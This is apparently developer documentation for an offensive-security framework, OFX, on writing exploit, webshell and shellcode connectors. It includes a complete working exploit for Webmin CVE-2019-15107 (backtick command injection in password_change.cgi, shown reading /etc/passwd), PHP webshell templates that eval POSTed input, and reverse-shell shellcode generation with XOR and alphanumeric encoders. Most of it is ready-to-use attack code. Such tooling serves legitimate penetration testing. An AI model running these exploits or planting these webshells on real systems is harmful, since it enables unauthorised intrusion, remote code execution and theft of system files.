# Developing Connectors

Learn how to create custom connectors to extend OFX functionality with webshells, shellcode, and exploits.

## Overview

OFX provides three main connector types:

1. **Exploit Connectors** - Vulnerability exploitation modules
2. **Webshell Connectors** - Web shell generators and handlers
3. **Shellcode Connectors** - Shellcode generation and encoding

All connectors follow a base class pattern that provides common functionality while allowing customization.

## Exploit Connectors

Exploit connectors are inspired by [pocsuite3](https://pocsuite.org) and provide a framework for creating modular vulnerability exploits.

### Base Class Structure

```python
from ofx.api.exploitation.exploit import ExploitBase, ExploitResult, ExploitMode

class MyExploit(ExploitBase):
    def __init__(self):
        super().__init__()
        
        # Metadata
        self.name = "Vulnerability Name"
        self.app_name = "Target Application"
        self.app_version = "1.0-2.0"
        self.author = "Your Name"
        self.description = "Brief description"
        self.vul_type = "RCE"  # RCE, SQLi, XSS, LFI, etc.
        self.references = [
            "CVE-2023-XXXX",
            "https://advisory-url.com"
        ]
        self.create_date = "2024-01-01"
        self.update_date = "2024-01-01"
    
    def _verify(self) -> ExploitResult:
        """Verify vulnerability exists (non-destructive)."""
        if not self._check():
            return self.parse_output({
                "success": False,
                "error": "Target check failed"
            })
        
        # Verification logic here
        return self.parse_output({"success": True})
    
    def _attack(self) -> ExploitResult:
        """Execute exploit attack."""
        # Attack logic here
        pass
    
    def _shell(self) -> ExploitResult:
        """Get interactive shell (optional)."""
        return self._attack()
```

### Available Methods

#### `_check(dork="", allow_redirects=False, honeypot_check=True)`

Performs comprehensive target validation:
- Port connectivity check
- HTTP/HTTPS protocol auto-correction
- Keyword search in response
- Honeypot detection

```python
def _verify(self):
    # Check if target is valid and contains "Admin Panel"
    if not self._check(dork="Admin Panel", honeypot_check=True):
        return self.parse_output({"success": False})
    
    # Proceed with verification
    ...
```

#### `parse_output(result: dict) -> ExploitResult`

Formats exploit results consistently:

```python
return self.parse_output({
    "success": True,
    "output": "Command executed successfully",
    "metadata": {
        "shell_type": "/bin/bash",
        "user": "www-data"
    }
})
```

#### `get_option(key, default=None)`

Retrieves custom options passed to the exploit:

```python
def _attack(self):
    command = self.get_option("command", "whoami")
    timeout = self.get_option("timeout", 30)
    # Use options in exploit
```

### Available Attributes

- `self.url` - Normalized target URL
- `self.scheme` - Protocol (http, https, tcp)
- `self.rhost` - Remote hostname
- `self.rport` - Remote port
- `self.mode` - Current execution mode
- `self.timeout` - Request timeout
- `self.options` - Custom options dictionary

### Execution Modes

1. **VERIFY** - Check if vulnerability exists (safe, non-destructive)
2. **ATTACK** - Exploit the vulnerability
3. **SHELL** - Get interactive shell access

### Complete Example

```python
"""
Webmin Pre-Auth RCE (CVE-2019-15107)
"""

import requests
from ofx.api.exploitation.exploit import ExploitBase, ExploitResult

class WebminRCEExploit(ExploitBase):
    def __init__(self):
        super().__init__()
        
        self.name = "Webmin Pre-Auth RCE"
        self.app_name = "Webmin"
        self.app_version = "<= 1.920"
        self.author = "Security Team"
        self.description = "Remote code execution via password reset"
        self.vul_type = "RCE"
        self.references = [
            "CVE-2019-15107",
            "https://www.exploit-db.com/exploits/47230"
        ]
    
    def _verify(self):
        if not self._check(dork="webmin", honeypot_check=True):
            return self.parse_output({"success": False})
        
        # Send verification payload
        verify_payload = {
            "user": "test",
            "pam": "",
            "expired": "2",
            "old": "`echo vulnerable`",
            "new1": "test",
            "new2": "test"
        }
        
        try:
            response = requests.post(
                f"{self.url}/password_change.cgi",
                data=verify_payload,
                timeout=self.timeout,
                verify=False
            )
            
            if "vulnerable" in response.text:
                return self.parse_output({
                    "success": True,
                    "output": "Vulnerability confirmed"
                })
        except Exception as e:
            pass
        
        return self.parse_output({"success": False})
    
    def _attack(self):
        command = self.get_option("command", "id")
        
        attack_payload = {
            "user": "root",
            "pam": "",
            "expired": "2",
            "old": f"`{command}`",
            "new1": "test",
            "new2": "test"
        }
        
        try:
            response = requests.post(
                f"{self.url}/password_change.cgi",
                data=attack_payload,
                timeout=self.timeout,
                verify=False
            )
            
            return self.parse_output({
                "success": True,
                "output": response.text,
                "metadata": {"command": command}
            })
        except Exception as e:
            return self.parse_output({
                "success": False,
                "error": str(e)
            })
```

### Using Exploits

```python
from ofx.api.exploitation.exploit import ExploitRunner, ExploitMode

# Create runner
runner = ExploitRunner()

# List available exploits
exploits = runner.list_exploits()
print(f"Available: {exploits}")

# Run in verify mode
result = runner.run_exploit(
    connector="webmin_rce",
    target="http://192.168.1.100:10000",
    mode=ExploitMode.VERIFY
)

if result.success:
    print("Vulnerability confirmed!")
    
    # Execute attack
    attack_result = runner.run_exploit(
        connector="webmin_rce",
        target="http://192.168.1.100:10000",
        mode=ExploitMode.ATTACK,
        options={"command": "cat /etc/passwd"}
    )
    
    print(f"Output: {attack_result.output}")
```

### File Location

Place exploit connectors in:

- **Built-in**: `{package}/ofx/api/exploitation/exploit/connectors/`
- **Custom**: `~/.ofx/exploits/`

File naming: `cve_2023_1234.py` or `app_name_vulnerability.py`

## Webshell Connectors

Webshell connectors generate and manage web shells for various platforms.

Custom connector files can be dropped into `~/.ofx/webshell/connectors/`
and are auto-discovered on startup.

### Base Class

```python
from ofx.api.exploitation.webshell.base import WebShell

class CustomWebShell(WebShell):
    def __init__(self, password="pass", encoder="default"):
        super().__init__(password, encoder)
    
    def generate(self) -> str:
        """Generate webshell code."""
        template = self.get_template("custom")
        return self.apply_template(template)
```

### Template System

Use placeholders in templates:

- `{{PASSWORD}}` - Password parameter
- `{{ENCODER}}` - Encoding method
- `{{SECRET_HEADER}}` - Authentication header
- `{{SECRET_VALUE}}` - Header value

```python
template = '''
<?php
$auth = $_SERVER['HTTP_{{SECRET_HEADER}}'] ?? '';
if ($auth !== '{{SECRET_VALUE}}') {
    die('Forbidden');
}

$cmd = $_POST['{{PASSWORD}}'];
if ({{ENCODER}}) {
    $cmd = base64_decode($cmd);
}
eval($cmd);
?>
'''

shell = CustomWebShell(
    password="cmd",
    encoder="base64",
    secret_header="X-Auth",
    secret_value="secret123"
)
code = shell.apply_template(template)
```

### Custom Templates

Register custom templates:

```python
from ofx.api.exploitation.webshell.shell.php import PhpShell

PhpShell.register_template(
    "mini",
    '<?php eval($_POST["{{PASSWORD}}"]); ?>'
)

shell = PhpShell(password="p")
shell.template = "mini"
code = shell.get_webshell()  # Uses mini template
```

## Shellcode Connectors

Shellcode connectors generate platform-specific shellcode.

Custom connector files can be dropped into `~/.ofx/shellcode/connectors/`
and are auto-discovered on startup.

### Base Class

```python
from ofx.api.exploitation.shellcode.base import ShellCode

class CustomShellcode(ShellCode):
    def __init__(self, connect_back_ip="127.0.0.1", connect_back_port=4444):
        super().__init__(
            os_target="linux",
            os_target_arch="x64",
            connect_back_ip=connect_back_ip,
            connect_back_port=connect_back_port
        )
        self.name = "Custom Linux x64 Reverse Shell"
    
    def generate(self) -> bytes:
        """Generate shellcode bytes."""
        # Generate shellcode
        shellcode = self._create_shellcode()
        
        # Apply formatting
        return self.format_shellcode(shellcode)
```

### Template Placeholders

Available in shellcode templates:

- `{{LHOST}}` - Connect back IP
- `{{LPORT}}` - Connect back port
- `{{OS}}` - Target OS
- `{{ARCH}}` - Target architecture

### Encoding

Apply encoders to avoid bad characters:

```python
from ofx.api.exploitation.shellcode.encoder import encode_xor, encode_alphanum

shellcode = b"\\x90\\x90\\x90\\x00\\x41\\x41"
bad_chars = ["\\x00", "\\x0a", "\\x0d"]

# XOR encoding
encoded = encode_xor(shellcode, key=0x42)

# Alphanumeric encoding
alpha = encode_alphanum(shellcode)
```

## Best Practices

### Security

1. **Verify Mode First** - Always implement safe verification before attack
2. **Timeout Handling** - Set appropriate timeouts to avoid hanging
3. **Error Handling** - Catch and log exceptions properly
4. **Honeypot Detection** - Use built-in `_check()` with honeypot detection

### Code Quality

1. **Metadata** - Fill all metadata fields (author, references, dates)
2. **Documentation** - Add docstrings to all methods
3. **Logging** - Use logger for debugging and status messages
4. **Testing** - Test against safe lab environments

### Performance

1. **Connection Pooling** - Reuse HTTP sessions when possible
2. **Parallel Execution** - Use async for multiple targets
3. **Resource Cleanup** - Close connections and files properly

## Testing Connectors

```python
# Test exploit locally
from ofx.api.exploitation.exploit import ExploitMode

class TestExploit(ExploitBase):
    def __init__(self):
        super().__init__()
        self.name = "Test Exploit"
    
    def _verify(self):
        return self.parse_output({"success": True})

# Test it
exploit = TestExploit()
exploit.set_target("http://localhost:8080")
exploit.set_mode(ExploitMode.VERIFY)
result = exploit.run()

assert result.success
print("Test passed!")
```

## Integration with Workflows

Use connectors in OFX workflows:

```yaml
name: Exploit Workflow
jobs:
  scan:
    steps:
      - name: Run exploit
        script: |
          from ofx.api.exploitation.exploit import ExploitRunner, ExploitMode
          
          runner = ExploitRunner()
          result = runner.run_exploit(
              connector="webmin_rce",
              target="{{ inputs.target }}",
              mode=ExploitMode.VERIFY
          )
          
          if result.success:
              print("Vulnerable!")
```

## Quick Reference

### Exploit Connector Template

```python
from ofx.api.exploitation.exploit import ExploitBase, ExploitResult

class MyExploit(ExploitBase):
    def __init__(self):
        super().__init__()
        # Metadata
        self.name = "..."
        self.vul_type = "RCE|SQLi|XSS|LFI|..."
    
    def _verify(self):
        if not self._check(): 
            return self.parse_output({"success": False})
        # Safe verification
        return self.parse_output({"success": True})
    
    def _attack(self):
        # Attack logic
        return self.parse_output({"success": True, "output": "..."})
```

### Common Patterns

**Target Validation:**
```python
if not self._check(dork="keyword", honeypot_check=True):
    return self.parse_output({"success": False})
```

**Get Options:**
```python
cmd = self.get_option("command", "whoami")
endpoint = self.get_option("endpoint", "/api")
```

**HTTP Request:**
```python
import requests
response = requests.post(
    f"{self.url}/endpoint",
    data={"param": "value"},
    timeout=self.timeout,
    verify=False
)
```

**Return Result:**
```python
return self.parse_output({
    "success": True,
    "output": "result data",
    "metadata": {"extra": "info"}
})
```

### Execution Modes

| Mode | Purpose | Method |
|------|---------|--------|
| `VERIFY` | Safe vulnerability check | `_verify()` |
| `ATTACK` | Execute exploit | `_attack()` |
| `SHELL` | Get interactive shell | `_shell()` |

### Available Attributes in Connectors

| Attribute | Description | Example |
|-----------|-------------|---------|
| `self.url` | Normalized target URL | `http://example.com` |
| `self.scheme` | Protocol | `http`, `https` |
| `self.rhost` | Remote hostname | `example.com` |
| `self.rport` | Remote port | `80`, `443` |
| `self.mode` | Current mode | `ExploitMode.VERIFY` |
| `self.timeout` | Request timeout | `30` |
| `self.options` | Custom options | `{"command": "id"}` |

## See Also

- [API Documentation](../cli/commands/docs-serve.md)
- [Exploit API Reference](../api/exploitation/exploit.md)
- [Webshell API Reference](../api/exploitation/webshell.md)
- [Shellcode API Reference](../api/exploitation/shellcode.md)
